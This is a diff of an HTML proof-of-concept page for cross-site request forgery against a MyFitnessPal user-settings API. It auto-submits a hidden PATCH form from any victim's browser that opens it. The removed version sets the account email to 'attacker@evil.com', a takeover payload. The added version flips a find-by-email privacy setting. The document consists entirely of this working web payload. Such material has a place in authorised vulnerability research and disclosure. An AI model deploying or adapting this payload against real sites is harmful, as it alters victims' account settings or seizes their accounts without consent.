@@ -1,8 +1,8 @@
 <html>
   <body>
-    <form action="https://www.myfitnesspal.com/api/services/users" method="POST">
+    <form action="https://www.myfitnesspal.com/api/services/users" method="POST" enctype="application/json">
       <input type="hidden" name="_method" value="PATCH">
-      <input type="hidden" name="item[email]" value="attacker@evil.com">
+      <input type="hidden" name="pref[find_by_email]" value="true">
     </form>
     <script>document.forms[0].submit();</script>
   </body>
